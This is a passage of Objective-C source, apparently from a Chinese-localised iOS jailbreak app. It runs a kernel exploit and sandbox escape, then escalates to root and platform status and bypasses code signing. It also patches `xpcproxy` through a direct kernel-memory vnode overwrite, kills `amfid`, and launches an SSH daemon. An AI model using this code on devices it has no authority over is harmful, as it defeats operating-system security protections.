            [self->_unjbtext setTitle:@"Cleaning /var/profile" forState:UIControlStateNormal];
            
        });
        removeFile("/var/motd");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/motd" forState:UIControlStateNormal];
            
        });
        removeFile("/var/dropbear");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/dropbear" forState:UIControlStateNormal];
            
        });
        removeFile("/var/log/testbin.log");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/log/testbin.log" forState:UIControlStateNormal];
            
        });
        removeFile("/var/log/jailbreakd-stdout.log");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/log/jailbreakd-stdout.log" forState:UIControlStateNormal];
            
        });
        removeFile("/var/log/jailbreakd-stderr.log");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/log/jailbreakd-stderr.log" forState:UIControlStateNormal];
            
        });
        removeFile("/var/log/pspawn_payload_xpcproxy.log");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/log/pspawn_payload_xpcproxy.log" forState:UIControlStateNormal];
            
        });
        removeFile("/var/containers/Bundle/.installed_rootlessJB3");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/containers/Bundle/.installed_rootlessJB3" forState:UIControlStateNormal];
            
        });
        removeFile("/var/lib");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/lib" forState:UIControlStateNormal];
            
        });
        removeFile("/var/etc");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/etc" forState:UIControlStateNormal];
            
        });
        removeFile("/var/usr");
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/usr" forState:UIControlStateNormal];
            
        });
        
        
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"3/3" forState:UIControlStateNormal];
            
        });
        
        sleep(2);
        
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Running uicache" forState:UIControlStateNormal];
            
        });
        
        launch("/var/containers/Bundle/tweaksupport/usr/bin/uicache", NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        NSArray *invalidApps = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/Apps" error:nil];
        for (NSString *app in invalidApps) {
            NSString *path = [@"/var/Apps" stringByAppendingPathComponent:app];
            removeFile([path UTF8String]);
        }
        
        
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Cleaning /var/bin" forState:UIControlStateNormal];
            
        });
        
        removeFile("/var/containers/Bundle/tweaksupport");
        removeFile("/var/containers/Bundle/iosbinpack64");
        
        term_jelbrek();
        
        dispatch_async(dispatch_get_main_queue(), ^{
            [self->_unjbtext setTitle:@"Finished."
             
                            forState:UIControlStateNormal];
            
        });
        
    });
    
}




- (IBAction)creditButtonAction:(UIButton *)sender {
    NSString *message = [NSString stringWithFormat:@"QQ: 946434404 \n  微信公众号: Cydia \n"];
    
    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"联系我"
                                                                             message:message
                                                                      preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *Done = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action){
        [alertController dismissViewControllerAnimated:true completion:nil];
    }];
    [alertController addAction:Done];
    [alertController setPreferredAction:Done];
    [self presentViewController:alertController animated:true completion:nil];
}

- (IBAction)optionButtonAction:(UIButton *)sender {
    [self creditButtonAction:nil];
}

void err_exploit(void *init){
    NSString *message = [NSString stringWithFormat:@"越狱失败，请重启你的设备再试一次。"];
    
    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:@"越狱" message:message preferredStyle:UIAlertControllerStyleAlert];
    [(__bridge UIViewController *)init presentViewController:alertController animated:true completion:nil];
}

- (IBAction)jailbreakButtonAction:(UIButton *)sender {
    
    if (self.removeSwitch.on) {
        [self uninstall];
    } else {
        [self jailbreakMe];
    }
}

- (IBAction)removeSwitchFlipped:(UISwitch *)sender {
        if (sender.on) {
            [self.jbtext setTitle:@"移除越狱" forState:UIControlStateNormal];
        } else {
            if ((flags & 0x4000000)) { // platform
                [self.jbtext setTitle:@"已越狱" forState:UIControlStateNormal];
                [self.jbtext setEnabled:NO];
            } else {
                [self.jbtext setTitle:@"一键越狱" forState:UIControlStateNormal];
            }
        }
}

-(void)jailbreakMe{
        [[UIApplication sharedApplication] beginIgnoringInteractionEvents];
        
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0ul), ^{
            
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"1/27"
                               forState:UIControlStateNormal];
                
            });
            
            // MARK: EXPLOIT
            if (runExploit((__bridge void *)(self)) == false){
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self->_jbtext setTitle:@"利用失败" forState:UIControlStateNormal];
                    err_exploit((__bridge void *)(self));
                });
                return;
            }
            
            if (escapeSandbox() == false){
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self->_jbtext setTitle:@"沙盒错误" forState:UIControlStateNormal];
                    err_exploit((__bridge void *)(self));
                });
                return;
            }
            
            
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"2/27" forState:UIControlStateNormal];
            });
            
            
            init_with_kbase(tfp0, kbase);
            
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"3/27" forState:UIControlStateNormal];
                
            });
            
            rootify(getpid());
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"4/27" forState:UIControlStateNormal];
                
            });
            
            
            setHSP4();
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"5/27" forState:UIControlStateNormal];
                
            });
            
            
            setcsflags(getpid()); // set some csflags
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"6/27" forState:UIControlStateNormal];
                
            });
            
            
            platformize(getpid()); // set TF_PLATFORM
            
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"7/27" forState:UIControlStateNormal];
                
            });
            
            
            UnlockNVRAM();
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"8/27" forState:UIControlStateNormal];
                
            });
            
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"9/27" forState:UIControlStateNormal];
                
            });
            
            
            // MARK: BOOTSTRAP
            if (!fileExists("/var/containers/Bundle/.installed_rootlessJB3")) {
                
                if (fileExists("/var/containers/Bundle/iosbinpack64")) {
                    
                    LOG("[*] Uninstalling previous build...");
                    
                    removeFile("/var/LIB");
                    removeFile("/var/ulb");
                    removeFile("/var/bin");
                    removeFile("/var/sbin");
                    removeFile("/var/containers/Bundle/tweaksupport/Applications");
                    removeFile("/var/Apps");
                    removeFile("/var/profile");
                    removeFile("/var/motd");
                    removeFile("/var/dropbear");
                    removeFile("/var/containers/Bundle/tweaksupport");
                    removeFile("/var/containers/Bundle/iosbinpack64");
                    removeFile("/var/containers/Bundle/dylibs");
                    removeFile("/var/log/testbin.log");
                    
                    if (fileExists("/var/log/jailbreakd-stdout.log")) removeFile("/var/log/jailbreakd-stdout.log");
                    if (fileExists("/var/log/jailbreakd-stderr.log")) removeFile("/var/log/jailbreakd-stderr.log");
                }
                
                LOG("[*] 安装 bootstrap 中...");
                
                chdir("/var/containers/Bundle/");
                FILE *bootstrap = fopen((char*)in_bundle("tars/iosbinpack.tar"), "r");
                untar(bootstrap, "/var/containers/Bundle/");
                fclose(bootstrap);
                
                FILE *tweaks = fopen((char*)in_bundle("tars/tweaksupport.tar"), "r");
                untar(tweaks, "/var/containers/Bundle/");
                fclose(tweaks);
                
                failIf(!fileExists("/var/containers/Bundle/tweaksupport") || !fileExists("/var/containers/Bundle/iosbinpack64"), "[-] Failed to install bootstrap");
                
                LOG("[+] 创建 symlinks 中...");
                
                symlink("/var/containers/Bundle/tweaksupport/Library", "/var/LIB");
                symlink("/var/containers/Bundle/tweaksupport/usr/lib", "/var/ulb");
                symlink("/var/containers/Bundle/tweaksupport/Applications", "/var/Apps");
                symlink("/var/containers/Bundle/tweaksupport/bin", "/var/bin");
                symlink("/var/containers/Bundle/tweaksupport/sbin", "/var/sbin");
                symlink("/var/containers/Bundle/tweaksupport/usr/libexec", "/var/libexec");
                
                close(open("/var/containers/Bundle/.installed_rootlessJB3", O_CREAT));
                
                //limneos
                symlink("/var/containers/Bundle/iosbinpack64/etc", "/var/etc");
                symlink("/var/containers/Bundle/tweaksupport/usr", "/var/usr");
                symlink("/var/containers/Bundle/iosbinpack64/usr/bin/killall", "/var/bin/killall");
                
                LOG("[+] 安装 bootstrap 完成!");
                
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self->_jbtext setTitle:@"10/27" forState:UIControlStateNormal];
                    
                });
                
                
            }
            
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"11/27" forState:UIControlStateNormal];
            });
            
            
            // MARK: JBDaemon
            //---- for jailbreakd & amfid ----//
            failIf(dumpOffsetsToFile("/var/containers/Bundle/tweaksupport/offsets.data"), "[-] Failed to save offsets");
            
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"12/27" forState:UIControlStateNormal];
            });
            
            //---- different tools ----//
            
            if (!fileExists("/var/bin/strings")) {
                chdir("/");
                FILE *essentials = fopen((char*)in_bundle("tars/bintools.tar"), "r");
                untar(essentials, "/");
                fclose(essentials);
                
                FILE *dpkg = fopen((char*)in_bundle("tars/dpkg-rootless.tar"), "r");
                untar(dpkg, "/");
                fclose(dpkg);
            }
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"13/27" forState:UIControlStateNormal];
            });
            
            // MARK: OPENSSH
            //---- update dropbear ----//
            chdir("/var/containers/Bundle/");
            
            removeFile("/var/containers/Bundle/iosbinpack64/usr/local/bin/dropbear");
            removeFile("/var/containers/Bundle/iosbinpack64/usr/bin/scp");
            
            FILE *fixed_dropbear = fopen((char*)in_bundle("tars/dropbear.v2018.76.tar"), "r");
            untar(fixed_dropbear, "/var/containers/Bundle/");
            fclose(fixed_dropbear);
            
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"14/27" forState:UIControlStateNormal];
            });
            
            //---- update jailbreakd ----//
            // MARK: JBDaemon Update
            removeFile("/var/containers/Bundle/iosbinpack64/bin/jailbreakd");
            if (!fileExists(in_bundle("bins/jailbreakd"))) {
                chdir(in_bundle("bins/"));
                
                FILE *jbd = fopen(in_bundle("bins/jailbreakd.tar"), "r");
                untar(jbd, in_bundle("bins/jailbreakd"));
                fclose(jbd);
                
                removeFile(in_bundle("bins/jailbreakd.tar"));
            }
            copyFile(in_bundle("bins/jailbreakd"), "/var/containers/Bundle/iosbinpack64/bin/jailbreakd");
            
            removeFile("/var/containers/Bundle/iosbinpack64/pspawn.dylib");
            if (!fileExists(in_bundle("bins/pspawn.dylib"))) {
                chdir(in_bundle("bins/"));
                
                FILE *jbd = fopen(in_bundle("bins/pspawn.dylib.tar"), "r");
                untar(jbd, in_bundle("bins/pspawn.dylib"));
                fclose(jbd);
                
                removeFile(in_bundle("bins/pspawn.dylib.tar"));
            }
            copyFile(in_bundle("bins/pspawn.dylib"), "/var/containers/Bundle/iosbinpack64/pspawn.dylib");
            
            removeFile("/var/containers/Bundle/iosbinpack64/amfid_payload.dylib");
            if (!fileExists(in_bundle("bins/amfid_payload.dylib"))) {
                chdir(in_bundle("bins/"));
                
                FILE *jbd = fopen(in_bundle("bins/amfid_payload.dylib.tar"), "r");
                untar(jbd, in_bundle("bins/amfid_payload.dylib"));
                fclose(jbd);
                
                removeFile(in_bundle("bins/amfid_payload.dylib.tar"));
            }
            copyFile(in_bundle("bins/amfid_payload.dylib"), "/var/containers/Bundle/iosbinpack64/amfid_payload.dylib");
            
            removeFile("/var/containers/Bundle/tweaksupport/usr/lib/TweakInject.dylib");
            if (!fileExists(in_bundle("bins/TweakInject.dylib"))) {
                chdir(in_bundle("bins/"));
                
                FILE *jbd = fopen(in_bundle("bins/TweakInject.tar"), "r");
                untar(jbd, in_bundle("bins/TweakInject.dylib"));
                fclose(jbd);
                
                removeFile(in_bundle("bins/TweakInject.tar"));
            }
            copyFile(in_bundle("bins/TweakInject.dylib"), "/var/containers/Bundle/tweaksupport/usr/lib/TweakInject.dylib");
            
            removeFile("/var/log/pspawn_payload_xpcproxy.log");
            
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"15/27" forState:UIControlStateNormal];
            });
            
            //---- codesign patch ----//
            // MARK: CODESIGN
            if (!fileExists(in_bundle("bins/tester"))) {
                chdir(in_bundle("bins/"));
                
                FILE *f1 = fopen(in_bundle("bins/tester.tar"), "r");
                untar(f1, in_bundle("bins/tester"));
                fclose(f1);
                
                removeFile(in_bundle("bins/tester.tar"));
            }
            
            chmod(in_bundle("bins/tester"), 0777); // give it proper permissions
            
            if (launch(in_bundle("bins/tester"), NULL, NULL, NULL, NULL, NULL, NULL, NULL)) {
                failIf(trustbin("/var/containers/Bundle/iosbinpack64"), "[-] Failed to trust binaries!");
                failIf(trustbin("/var/containers/Bundle/tweaksupport"), "[-] Failed to trust binaries!");
                
                // test
                int ret = launch("/var/containers/Bundle/iosbinpack64/test", NULL, NULL, NULL, NULL, NULL, NULL, NULL);
                failIf(ret, "[-] 未能信任二进制文件!");
                LOG("[+] 成功注入二进制文件!");
            }
            else {
                LOG("[+] 二进制文件已经信任?");
            }
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"16/27" forState:UIControlStateNormal];
            });
            
            //---- let's go! ----//
            
            prepare_payload(); // this will chmod 777 everything
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"17/27" forState:UIControlStateNormal];
            });
            
            // MARK: SETUP
            //----- setup SSH -----//
            mkdir("/var/dropbear", 0777);
            removeFile("/var/profile");
            removeFile("/var/motd");
            chmod("/var/profile", 0777);
            chmod("/var/motd", 0777);
            
            copyFile("/var/containers/Bundle/iosbinpack64/etc/profile", "/var/profile");
            copyFile("/var/containers/Bundle/iosbinpack64/etc/motd", "/var/motd");
            
            // kill it if running
            launch("/var/containers/Bundle/iosbinpack64/usr/bin/killall", "-SEGV", "dropbear", NULL, NULL, NULL, NULL, NULL);
            failIf(launchAsPlatform("/var/containers/Bundle/iosbinpack64/usr/local/bin/dropbear", "-R", "-E", NULL, NULL, NULL, NULL, NULL), "[-] Failed to launch dropbear");
            pid_t dpd = pid_of_procName("dropbear");
            usleep(1000);
            if (!dpd) failIf(launchAsPlatform("/var/containers/Bundle/iosbinpack64/usr/local/bin/dropbear", "-R", "-E", NULL, NULL, NULL, NULL, NULL), "[-] Failed to launch dropbear");
            
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"18/27" forState:UIControlStateNormal];
            });
            
            //------------- launch daeamons -------------//
            //-- you can drop any daemon plist in iosbinpack64/LaunchDaemons and it will be loaded automatically --//
            
            plists = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/containers/Bundle/iosbinpack64/LaunchDaemons" error:nil];
            
            for (__strong NSString *file in plists) {
                printf("[*] Adding permissions to plist %s\n", [file UTF8String]);
                
                file = [@"/var/containers/Bundle/iosbinpack64/LaunchDaemons" stringByAppendingPathComponent:file];
                
                if (strstr([file UTF8String], "jailbreakd")) {
                    printf("[*] Found jailbreakd plist, special handling\n");
                    
                    NSMutableDictionary *job = [NSPropertyListSerialization propertyListWithData:[NSData dataWithContentsOfFile:file] options:NSPropertyListMutableContainers format:nil error:nil];
                    
                    job[@"EnvironmentVariables"][@"KernelBase"] = [NSString stringWithFormat:@"0x%16llx", KernelBase];
                    [job writeToFile:file atomically:YES];
                }
                
                chmod([file UTF8String], 0644);
                chown([file UTF8String], 0, 0);
            }
            
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"19/27" forState:UIControlStateNormal];
            });
            
            // clean up
            removeFile("/var/log/testbin.log");
            removeFile("/var/log/jailbreakd-stderr.log");
            removeFile("/var/log/jailbreakd-stdout.log");
            
            launch("/var/containers/Bundle/iosbinpack64/bin/launchctl", "unload", "/var/containers/Bundle/iosbinpack64/LaunchDaemons", NULL, NULL, NULL, NULL, NULL);
            launch("/var/containers/Bundle/iosbinpack64/bin/launchctl", "load", "/var/containers/Bundle/iosbinpack64/LaunchDaemons", NULL, NULL, NULL, NULL, NULL);
            
            sleep(1);
            
            failIf(!fileExists("/var/log/testbin.log"), "[-] Failed to load launch daemons");
            failIf(!fileExists("/var/log/jailbreakd-stdout.log"), "[-] Failed to load jailbreakd");
            
            if (!fileExists("/var/containers/Bundle/tweaksupport/data/ents"))
            {
                if (fileExists(in_bundle("tars/ents.tar"))) {
                    mkdir("/var/containers/Bundle/tweaksupport/data", 0777);
                    chdir("/var/containers/Bundle/tweaksupport/data/");
                    FILE *ents = fopen((char*)in_bundle("tars/ents.tar"), "r");
                    untar(ents, "/var/containers/Bundle/tweaksupport/data/");
                    fclose(ents);
                }
            }
            
            if (!fileExists("/var/containers/Bundle/tweaksupport/data/.installed_debs"))
            {
                NSString *debs_path = [[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"debs"];
                NSArray *debs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:debs_path error:nil];
                for (NSString *deb in debs) {
                    /* run dpkg -i */
                    char *environ[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/bin/X11:/usr/games:/var/containers/Bundle/iosbinpack64/usr/local/sbin:/var/containers/Bundle/iosbinpack64/usr/local/bin:/var/containers/Bundle/iosbinpack64/usr/sbin:/var/containers/Bundle/iosbinpack64/usr/bin:/var/containers/Bundle/iosbinpack64/sbin:/var/containers/Bundle/iosbinpack64/bin", NULL};
                    launch("/var/bin/dpkg", "-i", (char *)[[debs_path stringByAppendingPathComponent:deb] UTF8String], NULL, NULL, NULL, NULL, (char **)environ);
                }
                close(open("/var/containers/Bundle/tweaksupport/data/.installed_debs", O_CREAT));
            }
            dispatch_async(dispatch_get_main_queue(), ^{
                [self->_jbtext setTitle:@"20/27" forState:UIControlStateNormal];
            });
            
            // MARK: INJECT TWEAK
            if (self.tweaks.isOn) {
                
                LOG("[*] Time for magic");
                
                char *xpcproxy = "/var/libexec/xpcproxy";
                char *dylib = "/var/ulb/pspawn.dylib";
                
                if (!fileExists(xpcproxy)) {
                    bool cp = copyFile("/usr/libexec/xpcproxy", xpcproxy);
                    failIf(!cp, "[-] Can't copy xpcproxy!");
                    symlink("/var/containers/Bundle/iosbinpack64/pspawn.dylib", dylib);
                    
                    LOG("[*] Patching xpcproxy");
                    
                    const char *args[] = { "insert_dylib", "--all-yes", "--inplace", "--overwrite", dylib, xpcproxy, NULL};
                    int argn = 6;
                    
                    failIf(add_dylib(argn, args), "[-] Failed to patch xpcproxy :(");
                    
                    LOG("[*] Resigning xpcproxy");
                    
                    failIf(system_("/var/containers/Bundle/iosbinpack64/usr/local/bin/jtool --sign --inplace --ent /var/containers/Bundle/iosbinpack64/default.ent /var/libexec/xpcproxy"), "[-] Failed to resign xpcproxy!");
                }
                
                chown(xpcproxy, 0, 0);
                chmod(xpcproxy, 755);
                failIf(trustbin(xpcproxy), "[-] Failed to trust xpcproxy!");
                
                uint64_t realxpc = getVnodeAtPath("/usr/libexec/xpcproxy");
                uint64_t fakexpc = getVnodeAtPath(xpcproxy);
                
                struct vnode rvp, fvp;
                KernelRead(realxpc, &rvp, sizeof(struct vnode));
                KernelRead(fakexpc, &fvp, sizeof(struct vnode));
                
                fvp.v_usecount = rvp.v_usecount;
                fvp.v_kusecount = rvp.v_kusecount;
                fvp.v_parent = rvp.v_parent;
                fvp.v_freelist = rvp.v_freelist;
                fvp.v_mntvnodes = rvp.v_mntvnodes;
                fvp.v_ncchildren = rvp.v_ncchildren;
                fvp.v_nclinks = rvp.v_nclinks;
                
                KernelWrite(realxpc, &fvp, sizeof(struct vnode)); // :o
                
                LOG("[?] 我们还活着吗??!");
                
                //----- magic end here -----//
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self->_jbtext setTitle:@"21/27" forState:UIControlStateNormal];
                });
                
                // cache pid and we're done
                pid_t installd = pid_of_procName("installd");
                pid_t bb = pid_of_procName("backboardd");
                pid_t amfid = pid_of_procName("amfid");
                if (amfid) kill(amfid, SIGKILL);
                
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self->_jbtext setTitle:@"22/27" forState:UIControlStateNormal];
                });
                
                // AppSync
                
                fixMmap("/var/ulb/libsubstitute.dylib");
                fixMmap("/var/LIB/Frameworks/CydiaSubstrate.framework/CydiaSubstrate");
                fixMmap("/var/LIB/MobileSubstrate/DynamicLibraries/AppSyncUnified.dylib");
                
                if (installd) kill(installd, SIGKILL);
                
                if (true) {
                    /* Temporary fix uicache */
                    launch("/var/containers/Bundle/tweaksupport/usr/bin/uicache", NULL, NULL, NULL, NULL, NULL, NULL, NULL);
                    NSArray *invalidApps = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/Apps" error:nil];
                    for (NSString *app in invalidApps) {
                        NSString *path = [@"/var/Apps" stringByAppendingPathComponent:app];
                        removeFile([path UTF8String]);
                    }
                }
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self->_jbtext setTitle:@"23/27" forState:UIControlStateNormal];
                });
                
                // MARK: INSTALL Reprovision
                if (self.ReProvision.isOn) {
                    
                    LOG("[*] 安装 ReProvision 中");
                    
                    removeFile("/var/containers/Bundle/tweaksupport/Applications/ReProvision.app");
                    copyFile(in_bundle("apps/ReProvision.app"), "/var/containers/Bundle/tweaksupport/Applications/ReProvision.app");
                    
                    failIf(system_("/var/containers/Bundle/tweaksupport/usr/local/bin/jtool --sign --inplace --ent /var/containers/Bundle/tweaksupport/Applications/ReProvision.app/ent.xml /var/containers/Bundle/tweaksupport/Applications/ReProvision.app/ReProvision && /var/containers/Bundle/tweaksupport/usr/bin/inject /var/containers/Bundle/tweaksupport/Applications/ReProvision.app/ReProvision"), "[-] Failed to sign ReProvision");
                    
                    removeFile("/var/LIB/MobileSubstrate/DynamicLibraries/ReProvision");
                    copyFile("/var/containers/Bundle/tweaksupport/Applications/ReProvision.app/ReProvision", "/var/LIB/MobileSubstrate/DynamicLibraries/ReProvision");
                    
                    // just in case
                    fixMmap("/var/ulb/libsubstitute.dylib");
                    fixMmap("/var/LIB/Frameworks/CydiaSubstrate.framework/CydiaSubstrate");
                    fixMmap("/var/LIB/MobileSubstrate/DynamicLibraries/AppSyncUnified.dylib");
                    
                    
                    removeFile("/var/containers/Bundle/tweaksupport/Library/LaunchDaemons/com.matchstic.reprovisiond.plist");
                    removeFile("/var/containers/Bundle/tweaksupport/usr/bin/reprovisiond");
                    
                    copyFile(in_bundle("apps/com.matchstic.reprovisiond.plist"), "/var/containers/Bundle/tweaksupport/Library/LaunchDaemons/com.matchstic.reprovisiond.plist");
                    copyFile(in_bundle("apps/reprovisiond"), "/var/containers/Bundle/tweaksupport/usr/bin/reprovisiond");
                    chmod("/var/containers/Bundle/tweaksupport/usr/bin/reprovisiond", 0777);
                    
                    //resign
                    failIf(trustbin("/var/containers/Bundle/iosbinpack64/usr/bin/reprovisiond"), "[-] Failed to trust binaries!");
                    
                    
                    //                failIf(launch("/var/containers/Bundle/tweaksupport/usr/bin/uicache", NULL, NULL, NULL, NULL, NULL, NULL, NULL), "[-] Failed to install iSuperSU");
                    
                }
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self->_jbtext setTitle:@"24/27" forState:UIControlStateNormal];
                });
                
                if(debug == true){
                    
                    
                    LOG("[*] Debug mode is on!");
                    
                    LOG("[*] Installing iSuperSU");
                    
                    removeFile("/var/containers/Bundle/tweaksupport/Applications/iSuperSU.app");
                    copyFile(in_bundle("apps/iSuperSU.app"), "/var/containers/Bundle/tweaksupport/Applications/iSuperSU.app");
                    
                    failIf(system_("/var/containers/Bundle/tweaksupport/usr/local/bin/jtool --sign --inplace --ent /var/containers/Bundle/tweaksupport/Applications/iSuperSU.app/ent.xml /var/containers/Bundle/tweaksupport/Applications/iSuperSU.app/iSuperSU && /var/containers/Bundle/tweaksupport/usr/bin/inject /var/containers/Bundle/tweaksupport/Applications/iSuperSU.app/iSuperSU"), "[-] Failed to sign iSuperSU");
                    
                    removeFile("/var/LIB/MobileSubstrate/DynamicLibraries/iSuperSU");
                    copyFile("/var/containers/Bundle/tweaksupport/Applications/iSuperSU.app/iSuperSU", "/var/LIB/MobileSubstrate/DynamicLibraries/iSuperSU");
                    
                    // just in case
                    fixMmap("/var/ulb/libsubstitute.dylib");
                    fixMmap("/var/LIB/Frameworks/CydiaSubstrate.framework/CydiaSubstrate");
                    fixMmap("/var/LIB/MobileSubstrate/DynamicLibraries/AppSyncUnified.dylib");
                    
                    
                }else{
                    LOG("[*] Debug mode is off!");
                    goto continue1;
                    
                    
                }
            continue1:
                dispatch_async(dispatch_get_main_queue(), ^{
                    [self->_jbtext setTitle:@"25/27" forState:UIControlStateNormal];
                });
                
                // MARK: Install Filza
                if (self.filza.isOn){
                    
                    LOG("[*] Installing Filza File Manager");
                    if (!fileExists("/var/libexec"))
                    {
                        symlink("/var/containers/Bundle/tweaksupport/usr/libexec", "/var/libexec");
                    }
                    mkdir("/var/containers/Bundle/tweaksupport/usr/libexec/filza", 0777);
                    chown("/var/containers/Bundle/tweaksupport/usr/libexec/filza", 0, 0);
                    chown("/var/mobile/Library/Filza/.Trash", 501, 501);
                    chown("/var/mobile/Library/Filza/.Trash.metadata", 501, 501);
                    chown("/var/root/Library/Filza/extensions.plist", 501, 501);
                    chown("/var/root/Library/Filza/links.plist", 501, 501);
                    chown("/var/root/Library/Filza/filza.db", 501, 501);
                    chown("/var/root/Library/Preferences/com.tigisoftware.Filza.plist", 501, 501);
                    
                    removeFile("/var/containers/Bundle/tweaksupport/Applications/Filza.app");
                    removeFile("/var/containers/Bundle/tweaksupport/usr/libexec/filza/Filza");
                    removeFile("/var/containers/Bundle/tweaksupport/usr/libexec/filza/FilzaHelper");
                    removeFile("/var/containers/Bundle/tweaksupport/usr/libexec/filza/FilzaWebDAVServer");
                    removeFile("/var/containers/Bundle/tweaksupport/Library/LaunchDaemons/com.tigisoftware.filza.helper.plist");
                    removeFile("/var/mobile/Library/Caches/ImageTables");
                    unlink("/var/containers/Bundle/tweaksupport/usr/libexec/filza/Filza");
                    
                    if (fileExists(in_bundle("apps/Filza.app.tar"))) {
                        chdir("/var/containers/Bundle/tweaksupport/Applications/");
                        FILE *app = fopen((char*)in_bundle("apps/Filza.app.tar"), "r");
                        untar(app, "/var/containers/Bundle/tweaksupport/Applications/");
                        fclose(app);
                    }
                    
                    copyFile(in_bundle("tars/com.tigisoftware.filza.helper.plist"), "/var/containers/Bundle/tweaksupport/Library/LaunchDaemons/com.tigisoftware.filza.helper.plist");
                    
                    chown("/var/containers/Bundle/tweaksupport/Library/LaunchDaemons/com.tigisoftware.filza.helper.plist", 0, 0);
                    
                    if (fileExists(in_bundle("bins/FilzaBins.tar"))) {
                        chdir("/var/containers/Bundle/tweaksupport/usr/libexec/filza/");
                        FILE *f1 = fopen(in_bundle("bins/FilzaBins.tar"), "r");
                        untar(f1, "/var/containers/Bundle/tweaksupport/usr/libexec/filza/");
                        fclose(f1);
                        
                        chown("/var/containers/Bundle/tweaksupport/usr/libexec/filza/Filza", 0, 0);
                        chown("/var/containers/Bundle/tweaksupport/usr/libexec/filza/FilzaHelper", 0, 0);
                        chown("/var/containers/Bundle/tweaksupport/usr/libexec/filza/FilzaWebDAVServer", 0, 0);
                        NSUInteger perm = S_ISUID | S_ISGID | S_IRUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH;
                        chmod("/var/containers/Bundle/tweaksupport/usr/libexec/filza/Filza", perm);
                        chmod("/var/containers/Bundle/tweaksupport/usr/libexec/filza/FilzaHelper", 0777);
                        chmod("/var/containers/Bundle/tweaksupport/usr/libexec/filza/FilzaWebDAVServer", 0777);
                    }
                    moveFile("/var/containers/Bundle/tweaksupport/Applications/Filza.app/PlugIns/Sharing.appex/Sharing", "/var/containers/Bundle/tweaksupport/usr/libexec/filza/Sharing");
                    symlink("/var/containers/Bundle/tweaksupport/usr/libexec/filza/Filza", "/var/bin/Filza");
                    
                    [self resignAndInjectToTrustCache:@"/var/containers/Bundle/tweaksupport/usr/libexec/filza/Filza" ents:@"platform.xml"];
                    [self resignAndInjectToTrustCache:@"/var/containers/Bundle/tweaksupport/usr/libexec/filza/FilzaHelper" ents:@"platform.xml"];
                    [self resignAndInjectToTrustCache:@"/var/containers/Bundle/tweaksupport/usr/libexec/filza/FilzaWebDAVServer" ents:@"platform.xml"];
                    [self resignAndInjectToTrustCache:@"/var/containers/Bundle/tweaksupport/Applications/Filza.app/Filza" ents:@"filza.xml"];
                    [self resignAndInjectToTrustCache:@"/var/containers/Bundle/tweaksupport/Applications/Filza.app/dylibs/libsmb2-ios.dylib" ents:@"dylib.xml"];
                    [self resignAndInjectToTrustCache:@"/var/containers/Bundle/tweaksupport/usr/libexec/filza/Sharing" ents:@"appex.xml"];
